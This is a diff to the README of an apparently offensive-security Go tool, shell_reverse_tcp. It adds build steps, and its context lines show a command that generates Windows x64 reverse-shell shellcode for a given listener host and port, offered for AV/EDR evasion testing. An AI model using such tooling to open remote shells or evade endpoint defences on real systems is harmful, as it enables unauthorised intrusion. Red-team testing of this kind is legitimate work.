@@ -18,6 +18,14 @@ Usage of ./shell_reverse_tcp:
 $ ./shell_reverse_tcp -host 192.168.100.100 -port 4444 > shellcode.bin
 ```
 
+# Build
+
+```bash
+git clone https://github.com/nchgroup/shell_reverse_tcp
+cd shell_reverse_tcp/
+go build .
+```
+
 # Project spirit
 Generate your payload in x64 quickly and easily without dependencies to perform AV/EDR evasion tests on Windows in amd64, so you can use encoders, ciphers, obfuscators, whatever.
 
